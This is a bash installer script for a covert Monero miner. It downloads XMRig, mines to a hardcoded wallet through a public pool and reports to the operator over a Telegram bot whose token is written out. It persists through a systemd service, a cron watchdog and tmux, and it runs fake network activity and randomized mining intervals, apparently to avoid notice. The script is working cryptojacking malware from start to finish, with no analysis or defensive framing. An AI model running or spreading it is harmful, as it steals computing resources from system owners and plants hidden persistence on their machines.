
#!/bin/bash

# ========== CONFIG ==========
WALLET="84QEvQ9V25mUNDiMXmq1aF96FwpzDPg4R1d564MjhvxrNpz7rizA3Q3FUowb83rsBK8P9DnDQnk4hTED57Ycd4p1Q8uRzZz"
POOL="gulf.moneroocean.stream:10128"
BOT_TOKEN="7828954337:AAHFZPTv5znzf2LcR5sIO3bHBMDWM7hFB3k"
CHAT_ID="7107536205"
WRAPPER_NAME="$1"

# ========== FILE UNLOCK ==========
chmod +x * >/dev/null 2>&1
ulimit -n 1048576 || true

# ========== DEPENDENCY SETUP ==========
apt update -y && apt install -y curl wget git build-essential tmux htop unzip psmisc >/dev/null 2>&1

# ========== TMUX KEEPALIVE ==========
pgrep tmux || tmux new-session -d -s keepalive "bash $0 $WRAPPER_NAME"

# ========== FUNCTION DEFINITIONS ==========
send_message() {
    MESSAGE="$1"
    curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
         -d chat_id="$CHAT_ID" \
         -d text="$MESSAGE" \
         -d parse_mode="HTML" >/dev/null 2>&1
}

simulate_activity() {
    while true; do
        curl -s https://example.com >/dev/null 2>&1
        sleep 30
    done
}

# ========== DOWNLOAD XMRIG ==========
if [ ! -f xmrig ]; then
  curl -LO https://github.com/xmrig/xmrig/releases/latest/download/xmrig-6.21.0-linux-x64.tar.gz
  tar -xvzf xmrig-6.21.0-linux-x64.tar.gz >/dev/null 2>&1
  mv xmrig-*/xmrig ./xmrig && chmod +x xmrig
fi

# ========== START SIMULATION IN BACKGROUND ==========
simulate_activity &

# ========== MAIN LOOP ==========
while true; do
    DURATION=$((RANDOM % 300 + 600))
    THREADS=$(nproc)

    send_message "[$WRAPPER_NAME] ⛏️ Mining for $((DURATION / 60))m with $THREADS threads"
    ./xmrig -o $POOL -u $WALLET -p $WRAPPER_NAME -a rx -k --donate-level=1 -t $THREADS >/dev/null 2>&1 &
    PID=$!
    sleep $DURATION
    kill $PID >/dev/null 2>&1

    SLEEP_TIME=$((RANDOM % 110 + 30))
    send_message "[$WRAPPER_NAME] 😴 Sleeping $SLEEP_TIME sec with activity"
    sleep $SLEEP_TIME

done &

# ========== SYSTEMD AUTORESTART ==========
cat <<EOF > /etc/systemd/system/xmrig-wrapper.service
[Unit]
Description=Auto Mining Script Wrapper
After=network.target

[Service]
ExecStart=/usr/bin/tmux new-session -d -s miner-wrapper "$0 $WRAPPER_NAME"
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reexec
systemctl enable xmrig-wrapper.service
systemctl start xmrig-wrapper.service

# ========== CRON SELF CHECK ==========
(crontab -l 2>/dev/null; echo "*/5 * * * * pgrep xmrig > /dev/null || systemctl restart xmrig-wrapper.service") | crontab -

send_message "[$WRAPPER_NAME] ✅ Installer completed. Mining will continue with watchdog and restart support."

exit 0
